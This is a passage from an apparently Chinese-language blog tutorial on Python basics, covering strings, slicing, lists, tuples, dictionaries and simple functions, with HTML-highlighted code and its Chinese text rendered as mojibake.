‡ï¼Œä¸‹æ ‡ä»0å¼€å§‹</span></span><br><span class="line"><span class="built_in">print</span>(a.index(<span class="string">&#x27;o&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#startswith() endswith()</span></span><br><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.startswith(<span class="string">&#x27;y&#x27;</span>))  <span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(a.endswith(<span class="string">&#x27;r&#x27;</span>))  <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#lower()/upper()</span></span><br><span class="line"><span class="comment">#å¯¹å…¨ä½“è¿›è¡Œæ“ä½œ</span></span><br><span class="line">a = <span class="string">&#x27;CooKie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.lower())</span><br><span class="line"><span class="built_in">print</span>(a.upper())</span><br></pre></td></tr></table></figure>

<h6 id="2-åˆ‡ç‰‡æ“ä½œ"><a href="#2-åˆ‡ç‰‡æ“ä½œ" class="headerlink" title="2.åˆ‡ç‰‡æ“ä½œ"></a>2.åˆ‡ç‰‡æ“ä½œ</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;we need a pwner&#x27;</span></span><br><span class="line"><span class="comment"># slice [start:end:step]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>) <span class="comment">#è¾“å‡ºå®Œæ•´æ•°æ®</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>]) <span class="comment">#æŸä¸ªæ•°æ®</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">3</span>:<span class="number">6</span>])  <span class="comment"># nee ç»“æŸç‚¹ä¸è¢«åŒ…å« å·¦é—­å³å¼€</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">3</span>:])  <span class="comment">#å–åˆ°æœ€å</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[:<span class="number">2</span>])  <span class="comment">#å–å‰ä¸¤ä½</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[::-<span class="number">1</span>]) <span class="comment">#å€’åºè¾“å‡º è´Ÿå·è¡¨ç¤ºæ–¹å‘ï¼Œä»å³è¾¹å¾€å·¦éå†</span></span><br></pre></td></tr></table></figure>

<h5 id="0x02-åˆ—è¡¨"><a href="#0x02-åˆ—è¡¨" class="headerlink" title="0x02:åˆ—è¡¨"></a>0x02:åˆ—è¡¨</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœ‰åºçš„æ•°æ®é›†åˆ</span><br><span class="line">1.å¯ä»¥éšæ—¶æ·»åŠ ã€åˆ é™¤å’Œä¿®æ”¹</span><br><span class="line">2.æ•°æ®æ˜¯å¯ä»¥å˜åŒ–çš„ï¼ˆæ•°æ®é¡¹å¯ä»¥å˜åŒ–ï¼Œä½†åœ°å€ä¸ä¼šæ”¹å˜</span><br><span class="line">3.ç”¨[]è¡¨ç¤ºåˆ—è¡¨ç±»å‹ï¼Œæ•°æ®é¡¹ä¹‹é—´ç”¨é€—å·åˆ†éš”ï¼Œæ³¨æ„ï¼šæ•°æ®é¡¹å¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„æ•°æ®</span><br><span class="line">4.æ”¯æŒç´¢å¼•å’Œåˆ‡ç‰‡æ¥è¿›è¡Œæ“ä½œ</span><br><span class="line"></span><br><span class="line">ç”¨forå¾ªç¯å¯å¯¹åˆ—è¡¨è¿›è¡Œéå†</span><br></pre></td></tr></table></figure>

<p>åˆ—è¡¨å®šä¹‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li = []</span><br><span class="line">print(type(li))</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•ï¼š</p>
<table>
<thead>
<tr>
<th>append</th>
<th>åœ¨åˆ—è¡¨åé¢è¿½åŠ å…ƒç´ </th>
</tr>
</thead>
<tbody><tr>
<td>len</td>
<td>è¾“å‡ºåˆ—è¡¨ä¸­å…ƒç´ ä¸ªæ•°</td>
</tr>
<tr>
<td>count</td>
<td>ç»Ÿè®¡å…ƒç´ å‡ºç°çš„æ¬¡æ•°</td>
</tr>
<tr>
<td>extend</td>
<td>æ‰©å±•ï¼Œç›¸å½“äºæ‰¹é‡æ·»åŠ </td>
</tr>
<tr>
<td>index</td>
<td>è·å–æŒ‡å®šå…ƒç´ ç´¢å¼•å·</td>
</tr>
<tr>
<td>insert</td>
<td>åœ¨æŒ‡å®šä½ç½®æ’å…¥</td>
</tr>
<tr>
<td>pop</td>
<td>åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´ </td>
</tr>
<tr>
<td>remove</td>
<td>ç§»é™¤å·¦è¾¹æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå…ƒç´ </td>
</tr>
<tr>
<td>reverse</td>
<td>åè½¬åˆ—è¡¨</td>
</tr>
<tr>
<td>sort</td>
<td>åˆ—è¡¨æ’åº</td>
</tr>
</tbody></table>
<h6 id="1-å¸¸ç”¨æ–¹æ³•ä½¿ç”¨-1"><a href="#1-å¸¸ç”¨æ–¹æ³•ä½¿ç”¨-1" class="headerlink" title="1.å¸¸ç”¨æ–¹æ³•ä½¿ç”¨"></a>1.å¸¸ç”¨æ–¹æ³•ä½¿ç”¨</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥æ‰¾ æ”¯æŒåˆ‡ç‰‡</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(li)  <span class="comment">#è¾“å‡ºå®Œæˆçš„åˆ—è¡¨</span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">0</span>]) <span class="comment">#è¾“å‡ºç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">1</span>:<span class="number">4</span>]) <span class="comment">#è¾“å‡ºç¬¬äºŒä¸ªåˆ°ç¬¬å››ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(li[<span class="number">2</span>:]) <span class="comment">#ç¬¬ä¸‰ä¸ªå…ƒç´ åˆ°æœ€å</span></span><br><span class="line"><span class="built_in">print</span>(li[::-<span class="number">1</span>])  <span class="comment">#å€’åºè¾“å‡º</span></span><br><span class="line"><span class="built_in">print</span>(li*<span class="number">2</span>)  <span class="comment">#å¤šæ¬¡è¾“å‡ºåˆ—è¡¨ä¸­çš„å…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(li.index(<span class="number">20</span>))  <span class="comment">#è¿”å›æŸ¥æ‰¾å…ƒç´ çš„ä¸‹æ ‡</span></span><br><span class="line"><span class="built_in">print</span>(li.index())</span><br><span class="line"><span class="comment"># index(å…ƒç´ ,start,end)  startå’Œendéƒ½æ˜¯ä¸‹æ ‡å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¢åŠ  append() insert() extend()</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line">li.append([<span class="string">&#x27;yer&#x27;</span>])  <span class="comment">#è¿½åŠ çš„æ˜¯åˆ—è¡¨</span></span><br><span class="line">li.append(<span class="string">&#x27;111&#x27;</span>) <span class="comment">#è¿½åŠ å…ƒç´ çš„æ—¶å€™åªèƒ½è¿½åŠ ä¸€ä¸ª</span></span><br><span class="line">li.insert(<span class="number">1</span>,<span class="string">&#x27;æ’å…¥æ•°æ®&#x27;</span>)  <span class="comment">#åœ¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´ </span></span><br><span class="line">d = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">11</span>))  <span class="comment">#å¼ºåˆ¶è½¬æ¢ä¸ºlistå¯¹è±¡</span></span><br><span class="line">li.extend(d) <span class="comment">#æ‰©å±•å¯ä»¥å°†å…¶ä»–åˆ—è¡¨ä¸­çš„å…ƒç´ å¢åŠ åˆ°è¿›è¡Œæ“ä½œçš„åˆ—è¡¨ä¹‹ä¸­ æ‰¹é‡å¢åŠ </span></span><br><span class="line">li.extend([<span class="string">&#x27;123&#x27;</span>,<span class="number">234</span>,<span class="string">&#x27;dc&#x27;</span>]) <span class="comment">#åŒä¸Š</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹  </span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;123&#x27;</span>]</span><br><span class="line">li[<span class="number">0</span>] = <span class="string">&#x27;tom&#x27;</span> <span class="comment">#å¯ä»¥ç›´æ¥ä¿®æ”¹ æ•°æ®ç±»å‹æ²¡æœ‰è¦æ±‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ é™¤ pop() del remove()</span></span><br><span class="line">li2 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>,<span class="number">51</span>))</span><br><span class="line"><span class="keyword">del</span> li2[<span class="number">0</span>]  <span class="comment">#åˆ é™¤ç¬¬ä¸€ä½å…ƒç´ </span></span><br><span class="line"><span class="keyword">del</span> li2[<span class="number">1</span>:<span class="number">3</span>] <span class="comment">#åˆ©ç”¨åˆ‡ç‰‡è¿›è¡Œæ‰¹é‡åˆ é™¤å…ƒç´ </span></span><br><span class="line">li2.remove(<span class="number">20</span>) <span class="comment">#ç§»é™¤æŒ‡å®šçš„å…ƒç´ </span></span><br><span class="line">li2.pop(<span class="number">1</span>)  <span class="comment">#ç§»é™¤æŒ‡å®šä¸‹æ ‡çš„å…ƒç´ </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="0x03-å…ƒç»„"><a href="#0x03-å…ƒç»„" class="headerlink" title="0x03:å…ƒç»„"></a>0x03:å…ƒç»„</h5><p><strong>tuple</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ƒç»„ï¼šæ˜¯ä¸€ç§ä¸å¯å˜çš„åºåˆ—ï¼Œåœ¨åˆ›å»ºä¹‹åä¸èƒ½åšä»»ä½•çš„ä¿®æ”¹</span><br><span class="line">1.ä¸å¯å˜</span><br><span class="line">2.ç”¨()åˆ›å»ºå…ƒç»„ç±»å‹ï¼Œæ•°æ®é¡¹ç”¨é€—å·åˆ†éš”</span><br><span class="line">3.å¯ä»¥æ˜¯ä»»ä½•çš„ç±»å‹</span><br><span class="line">4.å½“å…ƒç»„ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œè¦åŠ ä¸Šé€—å·ï¼Œä¸ç„¶è§£é‡Šå™¨ä¼šæŠŠå…ƒç»„å½“ä½œå…ƒç´ å¤„ç†</span><br><span class="line">5.æ”¯æŒåˆ‡ç‰‡æ“ä½œ</span><br></pre></td></tr></table></figure>

<p>å…ƒç»„åˆ›å»ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))  <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>

<h6 id="1-ç®€å•æ“ä½œ"><a href="#1-ç®€å•æ“ä½œ" class="headerlink" title="1.ç®€å•æ“ä½œ"></a>1.ç®€å•æ“ä½œ</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥è¯¢==&gt;forå¾ªç¯ ç´¢å¼• åˆ‡ç‰‡</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(a[::-<span class="number">1</span>])  <span class="comment">#å€’å™è¾“å‡º ä»å³å¾€å·¦ä¸‹æ ‡4ç›¸å½“äºä»å·¦å¾€å³ä¸‹æ ‡-1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a[<span class="number">3</span>])) <span class="comment">#åˆ—è¡¨ è™½ç„¶å…ƒç»„ä¸å¯ä¿®æ”¹ä½†æ˜¯å¯ä»¥å¯¹å…ƒç»„ä¸­çš„åˆ—è¡¨è¿›è¡Œä¿®æ”¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å†…ç½®æ–¹æ³• count  ç»Ÿè®¡å…ƒç´ åœ¨å…ƒç»„ä¸­å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(a.count(<span class="string">&#x27;yuer&#x27;</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å†…ç½®æ–¹æ³• index  æŸ¥æ‰¾æŒ‡å®šå…ƒç´ åœ¨å…ƒç»„ä¸­çš„ä¸‹æ ‡ç´¢å¼•</span></span><br><span class="line">a = (<span class="string">&#x27;123&#x27;</span>,<span class="number">123</span>,<span class="string">&#x27;yuer&#x27;</span>,[<span class="string">&#x27;111&#x27;</span>,<span class="number">111</span>,<span class="string">&#x27;yer&#x27;</span>],(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(a.index(<span class="string">&#x27;yuer&#x27;</span>))  <span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tupleA = ()  <span class="comment">#ç©ºå…ƒç»„</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tupleA))</span><br><span class="line">tupleA = (<span class="string">&#x27;adcd&#x27;</span>,<span class="number">11</span>,<span class="number">22</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(tupleA))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸¤æ¬¡çš„åœ°å€æ˜¯ä¸ä¸€æ ·çš„ å› ä¸ºå…ƒç»„æ˜¯ä¸å¯ä¿®æ”¹çš„</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-å­—å…¸"><a href="#0x04-å­—å…¸" class="headerlink" title="0x04:å­—å…¸"></a>0x04:å­—å…¸</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å¯ä»¥å­˜å‚¨ä»»æ„å¯¹è±¡ï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼åˆ›å»ºçš„&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;åˆ©ç”¨å¤§æ‹¬å·åŒ…è£¹ï¼Œæ•°æ®é¡¹ç”¨é€—å·åˆ†éš”</span><br><span class="line">2.å­—å…¸ä¸­æ‰¾æŸä¸ªå…ƒç´ æ—¶ï¼Œæ˜¯æ ¹æ®é”®ã€å€¼å­—å…¸çš„æ¯ä¸ªå…ƒç´ ç”±2éƒ¨åˆ†ç»„æˆ</span><br><span class="line">3.åœ¨æˆ‘ä»¬ä¸ç¡®å®šå­—å…¸ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªé”®è€Œåˆæƒ³è·å–å…¶å€¼çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨getæ–¹æ³•ï¼Œè¿˜å¯ä»¥è®¾ç½®é»˜è®¤å€¼</span><br><span class="line">4.å­—å…¸ä¸­é”®ä¸å¯é‡å¤ï¼Œå€¼å¯é‡å¤ï¼ˆå¦‚æœæœ‰é‡å¤çš„é”®ï¼Œåè€…ä¼šè¦†ç›–å‰è€…</span><br><span class="line">5.å­—å…¸çš„é”®åªèƒ½æ˜¯ä¸å¯å˜ç±»å‹ï¼šæ•°å­—ã€å­—ç¬¦ä¸²ã€å…ƒç»„ç­‰</span><br><span class="line">6.ä¸æ˜¯åºåˆ—ç±»å‹ï¼Œæ²¡æœ‰ä¸‹æ ‡æ¦‚å¿µï¼Œä¸èƒ½ä½¿ç”¨ç´¢å¼•ï¼Œæ˜¯pythonå†…ç½®çš„é«˜çº§æ•°æ®ç±»å‹</span><br></pre></td></tr></table></figure>

<h6 id="1-å¸¸ç”¨æ–¹æ³•"><a href="#1-å¸¸ç”¨æ–¹æ³•" class="headerlink" title="1.å¸¸ç”¨æ–¹æ³•"></a>1.å¸¸ç”¨æ–¹æ³•</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºå­—å…¸</span></span><br><span class="line">a = &#123;&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¢åŠ æ•°æ® </span></span><br><span class="line">a = &#123;&#125;</span><br><span class="line">a[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;yuer&#x27;</span> <span class="comment">#   key:value</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å…ƒç´ æ ¼å¼</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a))  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è·å–å…ƒç´  keys() values() items()</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&#x27;name&#x27;</span>]) <span class="comment">#åªèƒ½é€šè¿‡é”®è·å–å€¼ï¼Œå¹¶ä¸”å€¼å¯ä»¥ä¿®æ”¹</span></span><br><span class="line"><span class="built_in">print</span>(a.keys())  <span class="comment">#è·å–æ‰€æœ‰çš„é”®</span></span><br><span class="line"><span class="built_in">print</span>(a.values()) <span class="comment">#è·å–å€¼</span></span><br><span class="line"><span class="built_in">print</span>(a.items())  <span class="comment">#è·å–æ‰€æœ‰çš„é”®å€¼å¯¹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡forå¾ªç¯éå†</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹æ•°æ® update() add[]</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line">a.update(&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;cookie&#x27;</span>&#125;) <span class="comment">#æ›´æ–°æ•°æ® </span></span><br><span class="line">a.update(&#123;<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;18&#x27;</span>&#125;)  <span class="comment">#å¢åŠ æ•°æ®</span></span><br><span class="line">a.add[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ é™¤æ•°æ® del pop</span></span><br><span class="line">a = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>:<span class="string">&#x27;male&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">del</span> a[<span class="string">&#x27;name&#x27;</span>]   <span class="comment">#åˆ é™¤æŒ‡å®šé”®</span></span><br><span class="line">a.pop(<span class="string">&#x27;name&#x27;</span>)  <span class="comment">#åˆ é™¤æŒ‡å®šé”®</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ’åºæ“ä½œ sorted()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(a.items(),key=<span class="keyword">lambda</span> d:d[<span class="number">0</span>])) <span class="comment">#æŒ‰ç…§keyæ’åº</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(a.items(),key=<span class="keyword">lambda</span> d:d[<span class="number">1</span>])) <span class="comment">#æŒ‰valueæ’åºï¼Œä½†æ˜¯æ•°æ®ç±»å‹è¦ä¸€è‡´</span></span><br><span class="line"><span class="comment"># åœ¨å‡½æ•°sorted(a.items(), key = lambda d:d[1])ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼ ç»™ç¬¬äºŒä¸ªå‚æ•°â€œé”®-é”®å€¼â€ï¼Œç¬¬äºŒä¸ªå‚æ•°å–å‡ºå…¶ä¸­çš„é”®([0])æˆ–é”®å€¼(1])</span></span><br></pre></td></tr></table></figure>

<h5 id="0x05-å…¬ç”¨æ–¹æ³•"><a href="#0x05-å…¬ç”¨æ–¹æ³•" class="headerlink" title="0x05:å…¬ç”¨æ–¹æ³•"></a>0x05:å…¬ç”¨æ–¹æ³•</h5><h6 id="1-åˆå¹¶æ“ä½œ"><a href="#1-åˆå¹¶æ“ä½œ" class="headerlink" title="1.åˆå¹¶æ“ä½œ +"></a>1.åˆå¹¶æ“ä½œ +</h6><p><em>ä½¿ç”¨å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a+b)   <span class="comment">#yuer123</span></span><br><span class="line"></span><br><span class="line">listA = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">listB = [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(listA+listB)  <span class="comment">#[1, 2, 3, 7, 8, 9]</span></span><br><span class="line"></span><br><span class="line">tupleA = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">tupleB = (<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(tupleA+tupleB)  <span class="comment">#(1, 2, 3, 4, 5, 6)</span></span><br></pre></td></tr></table></figure>

<h6 id="2-å¤åˆ¶"><a href="#2-å¤åˆ¶" class="headerlink" title="2.å¤åˆ¶  *"></a>2.å¤åˆ¶  *</h6><p><em>å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">listA = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(listA*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">tupleA = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(tupleA*<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h6 id="3-inåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨"><a href="#3-inåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨" class="headerlink" title="3.inåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨"></a>3.inåˆ¤æ–­å…ƒç´ æ˜¯å¦å­˜åœ¨</h6><p><em>å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„ã€å­—å…¸</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> a)  <span class="comment">#boolå€¼</span></span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;yuer&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;age&#x27;</span> <span class="keyword">in</span> dic) <span class="comment">#è¿›è¡Œé”®æŸ¥è¯¢</span></span><br></pre></td></tr></table></figure>

<h3 id="4-pythonå‡½æ•°åŸºç¡€"><a href="#4-pythonå‡½æ•°åŸºç¡€" class="headerlink" title="4.pythonå‡½æ•°åŸºç¡€"></a>4.pythonå‡½æ•°åŸºç¡€</h3><h5 id="0x01-å‡½æ•°åŸºç¡€"><a href="#0x01-å‡½æ•°åŸºç¡€" class="headerlink" title="0x01:å‡½æ•°åŸºç¡€"></a>0x01:å‡½æ•°åŸºç¡€</h5><p><u>å‡½æ•°å®šä¹‰ï¼š</u></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def å…³é”®å­— å°æ‹¬å· :</span><br><span class="line">	ä»£ç å—</span><br><span class="line">	</span><br><span class="line">def å‡½æ•°å(å‚æ•°åˆ—è¡¨):</span><br><span class="line">	ä»£ç å—</span><br></pre></td></tr></table></figure>

<p><u>å‡½æ•°è¯´æ˜æ–‡æ¡£ï¼š</u></p>
<p>å‡½æ•°å†…å®¹çš„ç¬¬ä¸€è¡Œå¯ä»¥ç”¨å­—ç¬¦ä¸²è¿›è¡Œå‡½æ•°è¯´æ˜</p>
<hr>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inform</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ç”¨äºè¾“å‡ºä¿¡æ¯</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;yuer&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my age is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">11</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºä¸åŒçš„ä¿¡æ¯ï¼Œç”¨å‚æ•°å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inform</span>(<span class="params">name,age</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    è‡ªæˆ‘ä»‹ç»æ¨¡æ¿</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my age is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(age))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x02-å‡½æ•°å‚æ•°"><a href="#0x02-å‡½æ•°å‚æ•°" class="headerlink" title="0x02:å‡½æ•°å‚æ•°"></a>0x02:å‡½æ•°å‚æ•°</h5><p>å‚æ•°åˆ†ç±»ï¼š</p>
<p>å¿…é€‰å‚æ•°ã€é»˜è®¤å‚æ•°ï¼ˆç¼ºçœå‚æ•°ï¼‰ã€å¯é€‰å‚æ•°ã€å…³é”®å­—å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‚æ•°ï¼šå‡½æ•°ä¸ºäº†å®ç°æŸé¡¹ç‰¹å®šåŠŸèƒ½ï¼Œè¿›è€Œä¸ºäº†å¾—åˆ°å®ç°åŠŸèƒ½æ‰€éœ€è¦çš„æ•°æ®ï¼Œä¸ºäº†å¾—åˆ°å¤–éƒ¨æ•°æ®</span><br><span class="line">å¿…é€‰å‚æ•°ï¼šåœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™å¿…é¡»è¦èµ‹å€¼</span><br><span class="line">é»˜è®¤å‚æ•°ï¼š</span><br><span class="line"></span><br><span class="line"># å®šä¹‰å‡½æ•°å­¦ä¹ å‚æ•°</span><br></pre></td></tr></table></figure>

